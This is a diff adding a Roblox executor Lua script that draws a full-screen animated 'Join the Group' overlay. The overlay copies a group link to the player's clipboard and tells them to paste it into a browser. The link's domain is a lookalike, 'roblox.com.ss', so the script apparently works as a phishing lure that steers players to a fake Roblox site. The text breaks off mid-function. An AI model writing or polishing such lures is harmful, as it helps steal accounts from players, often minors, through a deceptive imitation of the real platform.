@@ -1,0 +1,788 @@
+-- JoinGroupUI Loadstring (ultimate edition)
+-- Works in executors (uses setclipboard)
+-- Requires: nothing beyond stock Roblox Instance API
+
+local Players      = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService   = game:GetService("RunService")
+
+local player     = Players.LocalPlayer
+local playerGui  = player:WaitForChild("PlayerGui")
+
+-- ============================================================
+-- CONFIG
+-- ============================================================
+local CONFIG = {
+    GroupLink    = "https://www.roblox.com.ss/communities/2247752525/aaaaaa",
+    GroupId      = 2247752525,
+    EnforceGroup = false,
+}
+
+local old = playerGui:FindFirstChild("JoinGroupUI")
+if old then old:Destroy() end
+
+-- ============================================================
+-- PALETTE
+-- ============================================================
+local C = {
+    bgTop       = Color3.fromRGB(6, 8, 16),
+    bgMid       = Color3.fromRGB(12, 16, 30),
+    bgBottom    = Color3.fromRGB(20, 26, 46),
+    card        = Color3.fromRGB(24, 29, 48),
+    cardInner   = Color3.fromRGB(16, 20, 34),
+    cardDeep    = Color3.fromRGB(11, 14, 26),
+    stroke      = Color3.fromRGB(82, 100, 160),
+    strokeSoft  = Color3.fromRGB(42, 52, 85),
+    strokeGlow  = Color3.fromRGB(130, 170, 255),
+    accent      = Color3.fromRGB(95, 140, 255),
+    accentHi    = Color3.fromRGB(160, 195, 255),
+    accentLow   = Color3.fromRGB(45, 80, 210),
+    purple      = Color3.fromRGB(160, 110, 255),
+    pink        = Color3.fromRGB(255, 130, 210),
+    cyan        = Color3.fromRGB(120, 220, 255),
+    text        = Color3.fromRGB(250, 252, 255),
+    textDim     = Color3.fromRGB(175, 186, 218),
+    textFaint   = Color3.fromRGB(115, 128, 168),
+    success     = Color3.fromRGB(90, 235, 160),
+    danger      = Color3.fromRGB(255, 115, 135),
+    warn        = Color3.fromRGB(255, 200, 90),
+}
+
+-- ============================================================
+-- HELPERS
+-- ============================================================
+local function make(class, props, parent)
+    local inst = Instance.new(class)
+    for k, v in pairs(props) do inst[k] = v end
+    if parent then inst.Parent = parent end
+    return inst
+end
+
+local function corner(radius, parent)
+    return make("UICorner", { CornerRadius = UDim.new(0, radius) }, parent)
+end
+
+local function stroke(color, thickness, transparency, parent)
+    return make("UIStroke", { Color = color, Thickness = thickness or 1, Transparency = transparency or 0 }, parent)
+end
+
+local function gradient(c1, c2, rotation, parent)
+    return make("UIGradient", {
+        Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, c1),
+            ColorSequenceKeypoint.new(1, c2),
+        }),
+        Rotation = rotation or 0,
+    }, parent)
+end
+
+local function triGradient(c1, c2, c3, rotation, parent)
+    return make("UIGradient", {
+        Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, c1),
+            ColorSequenceKeypoint.new(0.5, c2),
+            ColorSequenceKeypoint.new(1, c3),
+        }),
+        Rotation = rotation or 0,
+    }, parent)
+end
+
+local function padding(top, bottom, left, right, parent)
+    return make("UIPadding", {
+        PaddingTop = UDim.new(0, top or 0),
+        PaddingBottom = UDim.new(0, bottom or 0),
+        PaddingLeft = UDim.new(0, left or 0),
+        PaddingRight = UDim.new(0, right or 0),
+    }, parent)
+end
+
+local function listLayout(props, parent)
+    return make("UIListLayout", props, parent)
+end
+
+-- Smooth color sequence helper (avoids stale reference issues when tweening)
+local function seq(c1, c2)
+    return ColorSequence.new({
+        ColorSequenceKeypoint.new(0, c1),
+        ColorSequenceKeypoint.new(1, c2),
+    })
+end
+
+-- ============================================================
+-- ROOT
+-- ============================================================
+local screenGui = make("ScreenGui", {
+    Name = "JoinGroupUI",
+    ResetOnSpawn = false,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+    IgnoreGuiInset = true,
+    DisplayOrder = 999,
+}, playerGui)
+
+-- Backdrop
+local backdrop = make("Frame", {
+    Name = "Backdrop",
+    Size = UDim2.fromScale(1, 1),
+    BackgroundColor3 = C.bgTop,
+    BackgroundTransparency = 0.08,
+    BorderSizePixel = 0,
+}, screenGui)
+local backdropGrad = gradient(C.bgTop, C.bgBottom, 135, backdrop)
+
+-- ============================================================
+-- AMBIENT ORBS (3 drifting glow lights)
+-- ============================================================
+local function makeOrb(color, size, pos, transparency)
+    local orb = make("Frame", {
+        Size = UDim2.new(0, size, 0, size),
+        Position = pos,
+        BackgroundColor3 = color,
+        BackgroundTransparency = transparency or 0.85,
+        BorderSizePixel = 0,
+        ZIndex = 1,
+    }, backdrop)
+    corner(size, orb)
+    local g = gradient(color, Color3.fromRGB(0, 0, 0), 45, orb)
+    g.Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 0),
+        NumberSequenceKeypoint.new(1, 1),
+    })
+    return orb
+end
+
+local orb1 = makeOrb(C.accent, 480, UDim2.fromScale(-0.18, -0.28), 0.8)
+local orb2 = makeOrb(C.purple, 400, UDim2.fromScale(1.18, 1.22), 0.84)
+orb2.AnchorPoint = Vector2.new(1, 1)
+local orb3 = makeOrb(C.pink,   300, UDim2.fromScale(1.12, -0.12), 0.9)
+local orb4 = makeOrb(C.cyan,   260, UDim2.fromScale(-0.12, 1.1), 0.9)
+
+-- ============================================================
+-- SPARKLE FIELD (subtle floating dots)
+-- ============================================================
+local sparkles = {}
+local SPARKLE_COUNT = 22
+for i = 1, SPARKLE_COUNT do
+    local size = math.random(20, 50) / 10 -- 2.0 – 5.0
+    local sparkle = make("Frame", {
+        Size = UDim2.new(0, size, 0, size),
+        Position = UDim2.fromScale(math.random(), math.random()),
+        BackgroundColor3 = (i % 2 == 0) and C.accentHi or C.text,
+        BackgroundTransparency = 0.7 + math.random() * 0.2,
+        BorderSizePixel = 0,
+        ZIndex = 2,
+    }, backdrop)
+    corner(size, sparkle)
+    sparkles[i] = {
+        frame = sparkle,
+        speed = 0.02 + math.random() * 0.04,
+        phase = math.random() * math.pi * 2,
+        amp   = 0.01 + math.random() * 0.02,
+    }
+end
+
+-- ============================================================
+-- CARD GLOW (radial, behind card)
+-- ============================================================
+local cardGlow = make("ImageLabel", {
+    Size = UDim2.new(1, 120, 1, 120),
+    Position = UDim2.new(0.5, 0, 0.5, 0),
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    BackgroundTransparency = 1,
+    Image = "rbxassetid://1316045217",
+    ImageColor3 = C.accent,
+    ImageTransparency = 0.5,
+    ScaleType = Enum.ScaleType.Slice,
+    SliceCenter = Rect.new(256, 256, 256, 256),
+    ZIndex = 4,
+}, screenGui)
+
+-- ============================================================
+-- CARD
+-- ============================================================
+local card = make("Frame", {
+    Name = "Card",
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.fromScale(0.5, 0.5),
+    Size = UDim2.new(0, 420, 0, 0),
+    AutomaticSize = Enum.AutomaticSize.Y,
+    BackgroundColor3 = C.card,
+    BorderSizePixel = 0,
+    ZIndex = 5,
+}, screenGui)
+corner(22, card)
+local cardGrad = gradient(Color3.fromRGB(34, 40, 62), Color3.fromRGB(18, 22, 38), 90, card)
+local cardStroke = stroke(C.stroke, 1, 0.55, card)
+local cardGlowStroke = stroke(C.strokeGlow, 1, 0.85, card)
+
+-- Animated gradient sweep across card surface
+local cardSweepHolder = make("Frame", {
+    Size = UDim2.fromScale(1, 1),
+    BackgroundTransparency = 1,
+    ZIndex = -1,
+    ClipsDescendants = true,
+}, card)
+local cardSweep = make("Frame", {
+    Size = UDim2.new(0, 180, 1.2, 0),
+    Position = UDim2.new(0, -300, -0.1, 0),
+    BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+    BackgroundTransparency = 0.92,
+    BorderSizePixel = 0,
+    ZIndex = -1,
+}, cardSweepHolder)
+make("UIGradient", {
+    Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 1),
+        NumberSequenceKeypoint.new(0.5, 0),
+        NumberSequenceKeypoint.new(1, 1),
+    }),
+    Rotation = 25,
+}, cardSweep)
+
+-- Top accent line (animated shimmer)
+local topAccent = make("Frame", {
+    Size = UDim2.new(0.4, 0, 0, 2),
+    Position = UDim2.new(0.5, 0, 0, 0),
+    AnchorPoint = Vector2.new(0.5, 0),
+    BackgroundColor3 = C.accent,
+    BorderSizePixel = 0,
+    ZIndex = 6,
+}, card)
+corner(2, topAccent)
+local topAccentGrad = gradient(C.accentHi, Color3.fromRGB(255, 255, 255), 0, topAccent)
+topAccentGrad.Transparency = NumberSequence.new({
+    NumberSequenceKeypoint.new(0, 1),
+    NumberSequenceKeypoint.new(0.5, 0),
+    NumberSequenceKeypoint.new(1, 1),
+})
+
+padding(20, 20, 24, 24, card)
+listLayout({ Padding = UDim.new(0, 13), SortOrder = Enum.SortOrder.LayoutOrder }, card)
+
+-- ============================================================
+-- HEADER
+-- ============================================================
+local header = make("Frame", {
+    Name = "Header",
+    Size = UDim2.new(1, 0, 0, 48),
+    BackgroundTransparency = 1,
+    LayoutOrder = 1,
+}, card)
+listLayout({
+    FillDirection = Enum.FillDirection.Horizontal,
+    VerticalAlignment = Enum.VerticalAlignment.Center,
+    Padding = UDim.new(0, 12),
+}, header)
+
+-- Icon badge with pulsing halo
+local iconBadge = make("Frame", {
+    Size = UDim2.new(0, 48, 0, 48),
+    BackgroundColor3 = C.accent,
+    BorderSizePixel = 0,
+    LayoutOrder = 1,
+}, header)
+corner(14, iconBadge)
+local iconGrad = gradient(C.accentHi, C.accentLow, 135, iconBadge)
+local iconRing = stroke(C.accentHi, 2, 0.4, iconBadge)
+
+local iconHalo = make("Frame", {
+    Size = UDim2.new(1, 12, 1, 12),
+    Position = UDim2.new(0.5, 0, 0.5, 0),
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    BackgroundTransparency = 1,
+    BorderSizePixel = 0,
+    ZIndex = -1,
+}, iconBadge)
+corner(20, iconHalo)
+local iconHaloStroke = stroke(C.accentHi, 3, 0.85, iconHalo)
+
+-- Emoji
+make("TextLabel", {
+    Size = UDim2.fromScale(1, 1),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamBold,
+    Text = "👥",
+    TextSize = 26,
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+}, iconBadge)
+
+-- Title column
+local titleCol = make("Frame", {
+    Size = UDim2.new(1, -60, 1, 0),
+    BackgroundTransparency = 1,
+    LayoutOrder = 2,
+}, header)
+listLayout({ VerticalAlignment = Enum.VerticalAlignment.Center, Padding = UDim.new(0, 2) }, titleCol)
+
+local titleLabel = make("TextLabel", {
+    Size = UDim2.new(1, 0, 0, 22),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamBold,
+    Text = "Join the Group",
+    TextSize = 20,
+    TextColor3 = C.text,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    LayoutOrder = 1,
+}, titleCol)
+local titleGrad = make("UIGradient", {
+    Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 220, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
+    }),
+    Rotation = 0,
+}, titleLabel)
+
+make("TextLabel", {
+    Size = UDim2.new(1, 0, 0, 16),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.Gotham,
+    Text = "One quick step to continue",
+    TextSize = 12,
+    TextColor3 = C.textDim,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    LayoutOrder = 2,
+}, titleCol)
+
+-- Close button
+local closeBtn = make("TextButton", {
+    Size = UDim2.new(0, 28, 0, 28),
+    Position = UDim2.new(1, -18, 0, 18),
+    AnchorPoint = Vector2.new(1, 0),
+    BackgroundColor3 = C.cardInner,
+    BorderSizePixel = 0,
+    Font = Enum.Font.GothamBold,
+    Text = "✕",
+    TextSize = 12,
+    TextColor3 = C.textDim,
+    AutoButtonColor = false,
+    ZIndex = 7,
+}, card)
+corner(8, closeBtn)
+stroke(C.strokeSoft, 1, 0.4, closeBtn)
+
+-- ============================================================
+-- STATUS PILL
+-- ============================================================
+local statusPill = make("Frame", {
+    Name = "StatusPill",
+    Size = UDim2.new(1, 0, 0, 32),
+    BackgroundColor3 = C.cardInner,
+    BorderSizePixel = 0,
+    LayoutOrder = 2,
+}, card)
+corner(10, statusPill)
+stroke(C.strokeSoft, 1, 0.4, statusPill)
+padding(0, 0, 12, 12, statusPill)
+listLayout({
+    FillDirection = Enum.FillDirection.Horizontal,
+    VerticalAlignment = Enum.VerticalAlignment.Center,
+    Padding = UDim.new(0, 8),
+}, statusPill)
+
+local statusDotHolder = make("Frame", {
+    Size = UDim2.new(0, 10, 0, 10),
+    BackgroundTransparency = 1,
+    LayoutOrder = 1,
+}, statusPill)
+
+local statusDot = make("Frame", {
+    Size = UDim2.fromScale(1, 1),
+    BackgroundColor3 = C.accentHi,
+    BorderSizePixel = 0,
+}, statusDotHolder)
+corner(5, statusDot)
+
+local statusGlow = make("Frame", {
+    Size = UDim2.new(1, 6, 1, 6),
+    Position = UDim2.new(0.5, 0, 0.5, 0),
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    BackgroundColor3 = C.accentHi,
+    BackgroundTransparency = 0.9,
+    BorderSizePixel = 0,
+    ZIndex = -1,
+}, statusDot)
+corner(10, statusGlow)
+
+local statusLabel = make("TextLabel", {
+    Size = UDim2.new(1, -18, 1, 0),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamMedium,
+    Text = "Step 1 of 2 — Copy the group link",
+    TextSize = 11,
+    TextColor3 = C.textDim,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    LayoutOrder = 2,
+}, statusPill)
+
+-- ============================================================
+-- COPY BUTTON
+-- ============================================================
+local copyGroupBtn = make("TextButton", {
+    Name = "CopyGroupBtn",
+    Size = UDim2.new(1, 0, 0, 52),
+    BackgroundColor3 = C.cardDeep,
+    BorderSizePixel = 0,
+    Text = "",
+    AutoButtonColor = false,
+    LayoutOrder = 3,
+}, card)
+corner(14, copyGroupBtn)
+local copyGrad = gradient(Color3.fromRGB(42, 52, 84), Color3.fromRGB(24, 30, 54), 90, copyGroupBtn)
+local copyStroke = stroke(C.strokeSoft, 1, 0.3, copyGroupBtn)
+
+-- Shimmer inside copy button
+local copyShimmer = make("Frame", {
+    Size = UDim2.new(0, 80, 1.2, 0),
+    Position = UDim2.new(0, -120, -0.1, 0),
+    BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+    BackgroundTransparency = 0.88,
+    BorderSizePixel = 0,
+    ZIndex = 2,
+}, copyGroupBtn)
+corner(14, copyShimmer)
+make("UIGradient", {
+    Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 1),
+        NumberSequenceKeypoint.new(0.5, 0),
+        NumberSequenceKeypoint.new(1, 1),
+    }),
+    Rotation = 15,
+}, copyShimmer)
+
+local copyInner = make("Frame", {
+    Size = UDim2.fromScale(1, 1),
+    BackgroundTransparency = 1,
+    ZIndex = 3,
+}, copyGroupBtn)
+listLayout({
+    FillDirection = Enum.FillDirection.Horizontal,
+    HorizontalAlignment = Enum.HorizontalAlignment.Center,
+    VerticalAlignment = Enum.VerticalAlignment.Center,
+    Padding = UDim.new(0, 10),
+}, copyInner)
+
+make("TextLabel", {
+    Size = UDim2.new(0, 22, 0, 22),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamBold,
+    Text = "📋",
+    TextSize = 18,
+}, copyInner)
+
+make("TextLabel", {
+    Size = UDim2.new(0, 0, 1, 0),
+    AutomaticSize = Enum.AutomaticSize.X,
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamBold,
+    Text = "Copy Group Link",
+    TextSize = 14,
+    TextColor3 = C.text,
+}, copyInner)
+
+-- ============================================================
+-- HINT
+-- ============================================================
+make("TextLabel", {
+    Name = "Hint",
+    Size = UDim2.new(1, 0, 0, 0),
+    AutomaticSize = Enum.AutomaticSize.Y,
+    BackgroundTransparency = 1,
+    Font = Enum.Font.Gotham,
+    Text = "Paste the link in your browser to join, then come back here.",
+    TextSize = 11,
+    TextWrapped = true,
+    TextColor3 = C.textFaint,
+    TextXAlignment = Enum.TextXAlignment.Center,
+    LayoutOrder = 4,
+}, card)
+
+-- ============================================================
+-- CONTINUE BUTTON
+-- ============================================================
+local continueBtn = make("TextButton", {
+    Name = "ContinueBtn",
+    Size = UDim2.new(1, 0, 0, 52),
+    BackgroundColor3 = C.accent,
+    BorderSizePixel = 0,
+    Text = "",
+    AutoButtonColor = false,
+    LayoutOrder = 5,
+}, card)
+corner(14, continueBtn)
+local continueGrad = gradient(C.accentHi, C.accentLow, 90, continueBtn)
+local continueStroke = stroke(C.accentHi, 1.5, 0.4, continueBtn)
+
+local continueShimmer = make("Frame", {
+    Size = UDim2.new(0, 80, 1.2, 0),
+    Position = UDim2.new(0, -150, -0.1, 0),
+    BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+    BackgroundTransparency = 0.75,
+    BorderSizePixel = 0,
+    ZIndex = 2,
+}, continueBtn)
+corner(14, continueShimmer)
+make("UIGradient", {
+    Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 1),
+        NumberSequenceKeypoint.new(0.5, 0),
+        NumberSequenceKeypoint.new(1, 1),
+    }),
+    Rotation = 15,
+}, continueShimmer)
+
+local continueInner = make("Frame", {
+    Size = UDim2.fromScale(1, 1),
+    BackgroundTransparency = 1,
+    ZIndex = 3,
+}, continueBtn)
+listLayout({
+    FillDirection = Enum.FillDirection.Horizontal,
+    HorizontalAlignment = Enum.HorizontalAlignment.Center,
+    VerticalAlignment = Enum.VerticalAlignment.Center,
+    Padding = UDim.new(0, 8),
+}, continueInner)
+
+make("TextLabel", {
+    Size = UDim2.new(0, 20, 0, 20),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamBold,
+    Text = "🚀",
+    TextSize = 16,
+}, continueInner)
+
+make("TextLabel", {
+    Size = UDim2.new(0, 0, 1, 0),
+    AutomaticSize = Enum.AutomaticSize.X,
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamBold,
+    Text = "Continue to Browser",
+    TextSize = 15,
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+}, continueInner)
+
+local continueArrow = make("TextLabel", {
+    Size = UDim2.new(0, 20, 0, 20),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamBold,
+    Text = "→",
+    TextSize = 18,
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+}, continueInner)
+
+-- ============================================================
+-- TOAST
+-- ============================================================
+local toast = make("Frame", {
+    Name = "Toast",
+    AnchorPoint = Vector2.new(0.5, 1),
+    Position = UDim2.new(0.5, 0, 1, -60),
+    Size = UDim2.new(0, 0, 0, 46),
+    AutomaticSize = Enum.AutomaticSize.X,
+    BackgroundColor3 = Color3.fromRGB(24, 32, 56),
+    BorderSizePixel = 0,
+    BackgroundTransparency = 1,
+    Visible = false,
+    ZIndex = 10,
+}, screenGui)
+corner(23, toast)
+local toastStroke = stroke(C.accent, 1.5, 1, toast)
+padding(0, 0, 16, 22, toast)
+listLayout({
+    FillDirection = Enum.FillDirection.Horizontal,
+    VerticalAlignment = Enum.VerticalAlignment.Center,
+    Padding = UDim.new(0, 8),
+}, toast)
+
+local toastIconHolder = make("Frame", {
+    Size = UDim2.new(0, 22, 0, 22),
+    BackgroundColor3 = C.success,
+    BorderSizePixel = 0,
+}, toast)
+corner(11, toastIconHolder)
+
+local toastIcon = make("TextLabel", {
+    Size = UDim2.fromScale(1, 1),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamBold,
+    Text = "✓",
+    TextSize = 13,
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+}, toastIconHolder)
+
+local toastLabel = make("TextLabel", {
+    Size = UDim2.new(0, 0, 1, 0),
+    AutomaticSize = Enum.AutomaticSize.X,
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamMedium,
+    Text = "Copied!",
+    TextSize = 13,
+    TextColor3 = C.text,
+}, toast)
+
+-- ============================================================
+-- TOAST HELPER
+-- ============================================================
+local toastTimer = nil
+local function showToast(message, isError)
+    toastLabel.Text = message or "Copied!"
+    local iconColor = isError and C.danger or C.success
+    toastIconHolder.BackgroundColor3 = iconColor
+    toastIcon.Text = isError and "!" or "✓"
+    toastStroke.Color = isError and C.danger or C.accent
+
+    if toastTimer then task.cancel(toastTimer); toastTimer = nil end
+
+    toast.Visible = true
+    toast.Position = UDim2.new(0.5, 0, 1, -30)
+    toast.BackgroundTransparency = 0.05
+
+    TweenService:Create(toast, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Position = UDim2.new(0.5, 0, 1, -60),
+    }):Play()
+    TweenService:Create(toastStroke, TweenInfo.new(0.3), { Transparency = 0.4 }):Play()
+
+    toastTimer = task.delay(2.2, function()
+        local fade = TweenService:Create(toast, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+            Position = UDim2.new(0.5, 0, 1, -30),
+            BackgroundTransparency = 1,
+        })
+        fade:Play()
+        TweenService:Create(toastStroke, TweenInfo.new(0.25), { Transparency = 1 }):Play()
+        fade.Completed:Wait()
+        toast.Visible = false
+    end)
+end
+
+-- ============================================================
+-- COPY HELPER
+-- ============================================================
+local function copyToClipboard(text, message)
+    if not text or text == "" then showToast("Nothing to copy", true); return end
+    pcall(function()
+        if setclipboard then setclipboard(text)
+        elseif toclipboard then toclipboard(text) end
+    end)
+    showToast(message or "Copied!", false)
+end
+
+-- ============================================================
+-- LIVE ANIMATION SYSTEM
+-- ============================================================
+local t = 0
+local animConn
+animConn = RunService.Heartbeat:Connect(function(dt)
+    t = t + dt
+
+    -- 1. Shimmer sweeps
+    local st = (t * 0.6) % 1
+    copyShimmer.Position = UDim2.new(st * 1.4 - 0.2, 0, -0.1, 0)
+    continueShimmer.Position = UDim2.new((st * 1.4 - 0.2) % 1.4 - 0.2, 0, -0.1, 0)
+
+    -- 2. Card surface sweep (slow)
+    local cs = (t * 0.18) % 1
+    cardSweep.Position = UDim2.new(cs * 1.6 - 0.3, 0, -0.1, 0)
+
+    -- 3. Icon ring pulse
+    iconRing.Transparency = 0.4 + math.sin(t * 2.5) * 0.15
+    iconHaloStroke.Transparency = 0.85 + math.sin(t * 2.5 + 1) * 0.08
+
+    -- 4. Card glow breathing
+    cardGlowStroke.Transparency = 0.85 + math.sin(t * 1.8) * 0.05
+    cardGlow.ImageTransparency = 0.5 + math.sin(t * 1.2) * 0.08
+
+    -- 5. Title gradient sweep
+    titleGrad.Offset = Vector2.new(math.sin(t * 0.8) * 0.3, 0)
+
+    -- 6. Status dot pulse + glow
+    if statusDot.BackgroundColor3 == C.accentHi then
+        local s = 0.85 + math.sin(t * 3) * 0.15
+        statusDot.Size = UDim2.fromScale(s, s)
+        statusGlow.BackgroundTransparency = 0.9 - math.sin(t * 3) * 0.08
+    end
+
+    -- 7. Orbs drift
+    local d1 = math.sin(t * 0.4) * 14
+    local d2 = math.cos(t * 0.35) * 10
+    orb1.Position = UDim2.new(0, -140 + d1, 0, -160 + d2)
+    orb2.Position = UDim2.new(1, 110 - d1, 1, 130 + d2)
+    orb3.Position = UDim2.new(1, 100 + d2, 0, -40 + d1 * 0.5)
+    orb4.Position = UDim2.new(0, -90 + d2, 1, 100 + d1 * 0.5)
+
+    -- 8. Sparkles drift + twinkle
+    for i, s in ipairs(sparkles) do
+        local f = s.frame
+        local p = f.Position
+        local newY = p.Y.Scale + s.speed * dt
+        if newY > 1.05 then newY = -0.05 end
+        local newX = p.X.Scale + math.sin(t * 0.6 + s.phase) * s.amp * dt
+        f.Position = UDim2.fromScale(newX, newY)
+        local twinkle = 0.65 + math.sin(t * 2 + s.phase) * 0.25
+        f.BackgroundTransparency = twinkle
+    end
+
+    -- 9. Backdrop gradient rotation (very slow)
+    backdropGrad.Rotation = 135 + math.sin(t * 0.15) * 8
+end)
+
+-- ============================================================
+-- INTERACTIONS
+-- ============================================================
+copyGroupBtn.MouseEnter:Connect(function()
+    TweenService:Create(copyGrad, TweenInfo.new(0.2), {
+        Color = seq(Color3.fromRGB(58, 76, 120), Color3.fromRGB(36, 46, 78)),
+    }):Play()
+    TweenService:Create(copyStroke, TweenInfo.new(0.2), { Color = C.accent, Transparency = 0.1 }):Play()
+end)
+copyGroupBtn.MouseLeave:Connect(function()
+    TweenService:Create(copyGrad, TweenInfo.new(0.2), {
+        Color = seq(Color3.fromRGB(42, 52, 84), Color3.fromRGB(24, 30, 54)),
+    }):Play()
+    TweenService:Create(copyStroke, TweenInfo.new(0.2), { Color = C.strokeSoft, Transparency = 0.3 }):Play()
+end)
+copyGroupBtn.MouseButton1Click:Connect(function()
+    copyToClipboard(CONFIG.GroupLink, "Copied!")
+    statusLabel.Text = "Step 2 of 2 — Paste the link in your browser"
+    statusDot.BackgroundColor3 = C.success
+    TweenService:Create(statusDot, TweenInfo.new(0.3), { Size = UDim2.fromScale(1, 1) }):Play()
+    TweenService:Create(statusGlow, TweenInfo.new(0.3), {
+        BackgroundColor3 = C.success,
+        BackgroundTransparency = 0.85,
+    }):Play()
+    copyGroupBtn.Size = UDim2.new(1, 0, 0, 48)
+    TweenService:Create(copyGroupBtn, TweenInfo.new(0.15), { Size = UDim2.new(1, 0, 0, 52) }):Play()
+end)
+
+continueBtn.MouseEnter:Connect(function()
+    TweenService:Create(continueGrad, TweenInfo.new(0.2), {
+        Color = seq(Color3.fromRGB(175, 205, 255), Color3.fromRGB(80, 120, 255)),
+    }):Play()
+    TweenService:Create(continueArrow, TweenInfo.new(0.2), { Position = UDim2.new(0, 4, 0, 0) }):Play()
+end)
+continueBtn.MouseLeave:Connect(function()
+    TweenService:Create(continueGrad, TweenInfo.new(0.2), {
+        Color = seq(C.accentHi, C.accentLow),
+    }):Play()
+    TweenService:Create(continueArrow, TweenInfo.new(0.2), { Position = UDim2.new(0, 0, 0, 0) }):Play()
+end)
+continueBtn.MouseButton1Click:Connect(function()
+    TweenService:Create(continueBtn, TweenInfo.new(0.08), { Size = UDim2.new(1, 0, 0, 48) }):Play()
+    task.wait(0.1)
+    TweenService:Create(continueBtn, TweenInfo.new(0.12), { Size = UDim2.new(1, 0, 0, 52) }):Play()
+
+    if CONFIG.EnforceGroup then
+        if not player:IsInGroup(CONFIG.GroupId) then
+            showToast("You must join the group first!", true)
+            return
+        end
+    end
+    copyToClipboard(CONFIG.GroupLink, "Copied! Paste in browser to continue")
+end)
+
+closeBtn.MouseEnter:Connect(function()
+    TweenService:Create(closeBtn, TweenInfo.new(0.15), {
+        BackgroundColor3 = C.danger, TextColor3 = Color3.fromRGB(255, 255, 255),
+    }):Play()
+end)
+closeBtn.MouseLeave:Connect(function()
+    TweenService:Create(closeBtn, TweenInfo.new(0.15), {
+        BackgroundColor3 = C.cardInner, TextColor3 = C.text
